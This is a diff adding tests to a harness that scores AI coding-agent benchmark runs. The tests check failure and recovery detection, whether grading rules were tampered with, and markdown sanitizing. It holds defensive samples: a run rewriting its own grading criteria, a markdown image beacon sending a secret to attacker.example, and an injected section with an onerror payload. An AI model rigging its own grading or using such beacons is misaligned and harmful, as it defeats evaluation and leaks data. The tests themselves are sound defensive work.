@@ -30,6 +30,21 @@ def _evruns(runs):
     return {mode: _ev(run) for mode, run in runs.items()}
 
 
+def _codex_command(cmd, output="", exit_code=0):
+    """codex command_execution event line for event-timeline tests."""
+    return json.dumps(
+        {
+            "type": "item.completed",
+            "item": {
+                "type": "command_execution",
+                "command": cmd,
+                "aggregated_output": output,
+                "exit_code": exit_code,
+            },
+        }
+    )
+
+
 def _unwrap_cells(markdown: str) -> str:
     """Undo markdown_cell's <br> soft-wrapping so substring asserts stay stable."""
     return markdown.replace("<br>", " ")
@@ -274,6 +289,67 @@ def test_benchmark_insights_explains_docker_image_failures(tmp_path):
     assert run["available"] is True
     assert "Docker image unavailable" in failure_root_cause(_ev(run))
     assert "container exit 1" in human_readable_status(_ev(run))
+
+
+def _stage_evaluation_rules(mode_dir):
+    rules_dir = mode_dir / "evaluation_rules"
+    rules_dir.mkdir(parents=True, exist_ok=True)
+    (rules_dir / "rules.yaml").write_text("schema_version: 1\nsignals: {}\n", encoding="utf-8")
+    return rules_dir
+
+
+def test_collect_runs_scores_evaluation_rules_only_when_hash_matches_root_anchor(tmp_path):
+    from benchmark.harness.common import path_tree_sha256
+    from benchmark.harness.modes import NO_SKILLS_MODE
+    from benchmark.harness.profile_metadata import write_root_descriptor
+    from benchmark.harness.reports._loader import collect_benchmark_runs
+
+    mode_dir = tmp_path / NO_SKILLS_MODE
+    rules_dir = _stage_evaluation_rules(mode_dir)
+    trusted_sha = path_tree_sha256(rules_dir)
+    # The host anchors the criteria identity in the root-level descriptor,
+    # outside the container-writable mount.
+    write_root_descriptor(
+        tmp_path,
+        {"sdk_name": "nvflare", "evaluation_criteria": {"entrypoint": ".", "sha256": trusted_sha}},
+    )
+
+    run = collect_benchmark_runs(tmp_path)[NO_SKILLS_MODE]
+    assert run["evaluation_rules_status"] == "verified"
+    assert run["evaluation_rules_path"] == rules_dir
+
+
+def test_collect_runs_refuses_tampered_evaluation_rules_and_falls_back(tmp_path):
+    from benchmark.harness.common import path_tree_sha256
+    from benchmark.harness.modes import NO_SKILLS_MODE
+    from benchmark.harness.profile_metadata import write_root_descriptor
+    from benchmark.harness.reports._loader import collect_benchmark_runs
+
+    mode_dir = tmp_path / NO_SKILLS_MODE
+    rules_dir = _stage_evaluation_rules(mode_dir)
+    write_root_descriptor(
+        tmp_path,
+        {"sdk_name": "nvflare", "evaluation_criteria": {"entrypoint": ".", "sha256": path_tree_sha256(rules_dir)}},
+    )
+    # The run rewrites its own grading criteria in the mount after the anchor
+    # was recorded.
+    (rules_dir / "rules.yaml").write_text("schema_version: 1\nsignals: {everything: good}\n", encoding="utf-8")
+
+    run = collect_benchmark_runs(tmp_path)[NO_SKILLS_MODE]
+    assert run["evaluation_rules_status"] == "tampered"
+    assert run["evaluation_rules_path"] is None
+
+
+def test_collect_runs_ignores_unanchored_evaluation_rules(tmp_path):
+    from benchmark.harness.modes import NO_SKILLS_MODE
+    from benchmark.harness.reports._loader import collect_benchmark_runs
+
+    mode_dir = tmp_path / NO_SKILLS_MODE
+    _stage_evaluation_rules(mode_dir)
+    # No root descriptor: the mount copy is unauthenticated and must not score.
+    run = collect_benchmark_runs(tmp_path)[NO_SKILLS_MODE]
+    assert run["evaluation_rules_status"] == "unverifiable"
+    assert run["evaluation_rules_path"] is None
 
 
 def test_benchmark_insights_scopes_shared_console_evidence_by_mode(tmp_path):
@@ -4021,7 +4097,7 @@ def test_why_section_renders_when_with_skills_missing_result_even_if_faster(tmp_
     assert human_readable_status(typed[WITH_SKILLS_MODE], ctx.evidence[WITH_SKILLS_MODE]).startswith("needs review")
     assert benchmark_outcome(typed[WITH_SKILLS_MODE], ctx.evidence[WITH_SKILLS_MODE]).startswith("fail:")
     why = _unwrap_cells(why_section(typed, modes, ctx))
-    assert "## Why" in why
+    assert "## RCA" in why
     assert "**Why With skills needs more work**" in why
     assert "**Primary result failure**" in why
     assert "did not produce a usable FL result" in why
@@ -4442,7 +4518,7 @@ def test_why_section_renders_when_both_runs_fail_result_gate():
 
     why = why_section(_evruns(runs), [NO_SKILLS_MODE, WITH_SKILLS_MODE])
 
-    assert "## Why" in why
+    assert "## RCA" in why
     assert "**Why the comparison needs review**" in why
     assert "Both runs need review; neither side is a valid comparison winner" in why
     assert "Failed check `primary_metric_reporting`" in why
@@ -5373,7 +5449,7 @@ def test_why_section_reports_runtime_regression_when_total_time_is_not_slower():
 
     section = why_section(_evruns(runs), [NO_SKILLS_MODE, WITH_SKILLS_MODE])
 
-    assert "## Why" in section
+    assert "## RCA" in section
     assert "Why With skills has longer runtime after install" in section
     assert "| With skills | 500s | 50s | 450s | 400s |" in section
     assert "| No skills baseline | 600s | 300s | 300s | 40s |" in section
@@ -5462,7 +5538,7 @@ def test_why_section_reports_dependency_install_regression_when_runtime_is_not_s
 
     section = why_section(_evruns(runs), [NO_SKILLS_MODE, WITH_SKILLS_MODE])
 
-    assert "## Why" in section
+    assert "## RCA" in section
     assert "Why With skills has longer dependency install" in section
     assert "| With skills | 150s | 50s | 200s |" in section
     assert "| No skills baseline | 30s | 220s | 250s |" in section
@@ -8764,6 +8840,15 @@ def test_agent_markdown_is_sanitized_and_prompt_fence_is_dynamic(tmp_path):
     assert "`cmd <<'PY'`" in sanitized
     assert "<pre>fenced</pre>" in sanitized  # fenced blocks untouched
 
+    # A markdown image auto-fetches its URL on render — an injected beacon.
+    # It is demoted to a plain link (no leading !), so nothing loads until a
+    # human clicks and the URL stays visible.
+    beacon = sanitize_agent_markdown("look ![x](https://attacker.example/?d=SECRET) here")
+    assert "![" not in beacon
+    assert "[x](https://attacker.example/?d=SECRET)" in beacon
+    # Inside a code span the image syntax is inert and left verbatim.
+    assert sanitize_agent_markdown("`![x](http://a/b)`") == "`![x](http://a/b)`"
+
     prompt = "convert this\n`````\n## Injected section\n<img src=x onerror=steal()>"
     entries = []
     for index, mode in enumerate((NO_SKILLS_MODE, WITH_SKILLS_MODE), start=1):
@@ -9176,3 +9261,239 @@ def test_data_packaging_detector_precision():
         'parser.add_argument("--data-root", type=Path, default=Path("/workspace/data/ames"))\n'
     )
     assert requirements.startswith("configurable data_root argument")
+
+
+def test_prefixed_job_runs_are_recognized_as_job_runs():
+    from benchmark.harness.reports._events import (
+        _command_is_python_job_run,
+        event_timeline_from_text,
+        terminal_failure_anchor,
+    )
+
+    # Env-var and wrapper prefixes execute the same job as the unprefixed
+    # spelling; the "an install alone is not recovery; the job must be rerun"
+    # guard must see through them.
+    for prefixed in (
+        "CUDA_VISIBLE_DEVICES=0 python train.py",
+        "timeout 600 python3 -m nvflare.cli simulator jobs/j -n 2",
+        "timeout -k 5s 600 python3 -m nvflare.cli simulator jobs/j -n 2",
+        "env FOO=1 python train.py",
+        "nohup python train.py",
+        "time python train.py",
+    ):
+        assert _command_is_python_job_run(prefixed), prefixed
+
+    # Failed prefixed job + later successful install: the terminal failure
+    # must still anchor, because the job was never rerun.
+    events = "\n".join(
+        [
+            _codex_command(
+                "CUDA_VISIBLE_DEVICES=0 python train.py",
+                output="Traceback...\nModuleNotFoundError: No module named 'torch'",
+                exit_code=1,
+            ),
+            _codex_command("pip install torch", output="Successfully installed torch-2.12.0"),
+        ]
+    )
+    anchored = terminal_failure_anchor(event_timeline_from_text(events))
+    assert anchored is not None
+    assert "torch" in anchored[1]["display"]
+
+    # A successful rerun of the job (different prefix spelling, same key) IS recovery.
+    recovered = events + "\n" + _codex_command("python train.py", output="done")
+    assert terminal_failure_anchor(event_timeline_from_text(recovered)) is None
+
+
+def test_quoted_installer_text_is_not_install_recovery():
+    from benchmark.harness.reports._events import (
+        command_recovery_key,
+        event_timeline_from_text,
+        terminal_failure_anchor,
+    )
+
+    # Keying is token-based at the executable position: quoting an installer
+    # command line does not make the command an install.
+    assert command_recovery_key('echo "next step: pip install -r requirements.txt"') != "pip install requirements.txt"
+
+    events = "\n".join(
+        [
+            _codex_command(
+                "pip install -r requirements.txt",
+                output="OSError: [Errno 28] No space left on device",
+                exit_code=1,
+            ),
+            _codex_command(
+                'echo "next step: pip install -r requirements.txt"',
+                output="next step: pip install -r requirements.txt",
+            ),
+        ]
+    )
+    anchored = terminal_failure_anchor(event_timeline_from_text(events))
+    assert anchored is not None
+    assert "OSError" in anchored[1]["display"]
+
+    # A real successful rerun of the install still recovers.
+    recovered = events + "\n" + _codex_command("pip install -r requirements.txt", output="Successfully installed torch")
+    assert terminal_failure_anchor(event_timeline_from_text(recovered)) is None
+
+
+def test_script_run_fallback_key_uses_executable_and_script():
+    from benchmark.harness.reports._events import (
+        command_recovery_key,
+        event_timeline_from_text,
+        terminal_failure_anchor,
+    )
+
+    # The fallback key carries the real executable plus its first positional
+    # (basename-normalized, after prefix stripping), so unrelated commands
+    # sharing an interpreter or an env prefix do not collapse onto one key.
+    assert command_recovery_key("bash run_job.sh") == "bash run_job.sh"
+    assert command_recovery_key("DEBUG=1 bash run_job.sh") == "bash run_job.sh"
+    assert command_recovery_key("bash scripts/run_job.sh") == "bash run_job.sh"
+    assert command_recovery_key("bash cleanup.sh") != command_recovery_key("bash run_job.sh")
+    assert command_recovery_key("DEBUG=1 ls") != command_recovery_key("DEBUG=1 bash run_job.sh")
+
+    traceback = "Traceback...\nModuleNotFoundError: No module named 'torch'"
+    base = _codex_command("bash run_job.sh", output=traceback, exit_code=1)
+
+    # A later successful run of a DIFFERENT script must not clear the failure...
+    events = base + "\n" + _codex_command("bash cleanup.sh", output="cleaned")
+    anchored = terminal_failure_anchor(event_timeline_from_text(events))
+    assert anchored is not None
+    assert "torch" in anchored[1]["display"]
+
+    # ...and neither does installing the missing module without rerunning the
+    # script: a shell-script execution is a job run.
+    events = base + "\n" + _codex_command("pip install torch", output="Successfully installed torch-2.12.0")
+    assert terminal_failure_anchor(event_timeline_from_text(events)) is not None
+
+    # A successful rerun of the same script (prefixed, redirected) recovers.
+    events = base + "\n" + _codex_command("DEBUG=1 bash run_job.sh > run.log 2>&1", output="")
+    assert terminal_failure_anchor(event_timeline_from_text(events)) is None
+
+
+def test_stale_success_marker_from_non_job_command_is_not_recovery():
+    from benchmark.harness.reports._events import event_timeline_from_text, terminal_failure_anchor
+
+    # `python3 -c` printing an old log is not job-run-shaped: a stale
+    # `Result workspace:` line it echoes must not cancel the failure.
+    events = "\n".join(
+        [
+            _codex_command(
+                "python3 -m nvflare.cli simulator jobs/train -n 2",
+                output="Traceback...\nModuleNotFoundError: No module named 'torch'",
+                exit_code=1,
+            ),
+            _codex_command(
+                "python3 -c \"print(open('old.log').read())\"",
+                output="Result workspace: /tmp/old_run",
+            ),
+        ]
+    )
+    anchored = terminal_failure_anchor(event_timeline_from_text(events))
+    assert anchored is not None
+    assert "torch" in anchored[1]["display"]
+
+    # The same marker from a genuine job run still counts as recovery.
+    recovered = events + "\n" + _codex_command(
+        "python3 -m nvflare.cli simulator jobs/other -n 2", output="Result workspace: /tmp/new_run"
+    )
+    assert terminal_failure_anchor(event_timeline_from_text(recovered)) is None
+
+
+def test_pipeline_behind_inspection_head_can_anchor():
+    from benchmark.harness.reports._events import (
+        _command_is_inspection_only,
+        event_timeline_from_text,
+        terminal_failure_anchor,
+    )
+
+    # A pipeline is inspection-only only when EVERY stage inspects: a job run
+    # behind a cat/grep head still executes.
+    assert not _command_is_inspection_only("cat cfg.json | python3 run.py")
+    assert _command_is_inspection_only("cat server.log | grep -c epoch")
+
+    events = _codex_command(
+        "cat cfg.json | python3 run.py",
+        output="Traceback...\nConfigError: executors are not specified",
+        exit_code=1,
+    )
+    anchored = terminal_failure_anchor(event_timeline_from_text(events))
+    assert anchored is not None
+    assert "ConfigError" in anchored[1]["display"]
+
+
+def test_interpreter_value_options_do_not_hide_module_or_script():
+    from benchmark.harness.reports._events import _command_is_python_job_run, command_recovery_key
+
+    # `-W ignore` is a detached interpreter option value: it must neither
+    # bridge the module key back to bare `python` nor read as the script.
+    assert (
+        command_recovery_key("python -W ignore -m nvflare.cli simulator jobs/j1")
+        == "python -m nvflare.cli simulator j1"
+    )
+    assert _command_is_python_job_run("python -W ignore -m nvflare.cli simulator jobs/j1")
+    assert command_recovery_key("python -W ignore train.py") == "python train.py run"
+    assert _command_is_python_job_run("python -W ignore train.py")
+
+
+def test_boolean_short_flag_does_not_eat_job_target():
+    from benchmark.harness.reports._events import command_recovery_key
+
+    # `-q` is a boolean flag: it must not consume the job target, so a rerun
+    # without it still shares the key.
+    assert command_recovery_key("python -m nvflare.cli simulator -q jobs/j1") == "python -m nvflare.cli simulator j1"
+    assert command_recovery_key("python -m nvflare.cli simulator -q jobs/j1") == command_recovery_key(
+        "python3 -m nvflare.cli simulator jobs/j1"
+    )
+
+
+def test_redirection_tokens_do_not_fill_key_slots():
+    from benchmark.harness.reports._events import command_recovery_key
+
+    assert command_recovery_key("python3 -m nvflare.cli simulator > out.log 2>&1") == "python -m nvflare.cli simulator"
+    assert (
+        command_recovery_key("python3 -m nvflare.cli simulator jobs/j1 > out.log 2>&1")
+        == "python -m nvflare.cli simulator j1"
+    )
+    assert command_recovery_key("bash run_job.sh > run.log 2>&1") == "bash run_job.sh"
+
+
+def test_none_exit_requires_error_text_to_anchor():
+    from benchmark.harness.reports._events import event_timeline_from_text, terminal_failure_anchor
+
+    # A None exit code is unknown, not failed: it anchors only together with a
+    # recognized error signature in the output, never on its own.
+    silent = _codex_command("python3 job.py", output="all good", exit_code=None)
+    assert terminal_failure_anchor(event_timeline_from_text(silent)) is None
+
+    errored = _codex_command("python3 job.py", output="Traceback...\nRuntimeError: boom", exit_code=None)
+    anchored = terminal_failure_anchor(event_timeline_from_text(errored))
+    assert anchored is not None
+    assert "RuntimeError" in anchored[1]["display"]
+
+
+def test_inline_code_text_caps_adversarial_input():
+    import time
+
+    from benchmark.harness.reports._events import inline_code_text
+
+    # Output is truncated anyway; the input is capped before the heredoc regex
+    # so a multi-MB adversarial command cannot go quadratic.
+    adversarial = ("<< 'A'\n" + "x" * 64) * 40_000
+    start = time.monotonic()
+    summary = inline_code_text(adversarial)
+    assert time.monotonic() - start < 2.0
+    assert len(summary) <= 180
+
+    # Heredoc bodies still summarize.
+    assert inline_code_text("python - <<EOF\nprint(1)\nEOF") == "python - <<EOF ... EOF"
+
+
+def test_prefixed_install_reads_as_installer():
+    from benchmark.harness.reports._events import is_dependency_install_command
+
+    # The shared prefix stripper serves install detection too.
+    assert is_dependency_install_command("PIP_NO_CACHE_DIR=1 pip install torch")
+    assert is_dependency_install_command("sudo pip install torch")
+    assert not is_dependency_install_command("echo pip install torch")
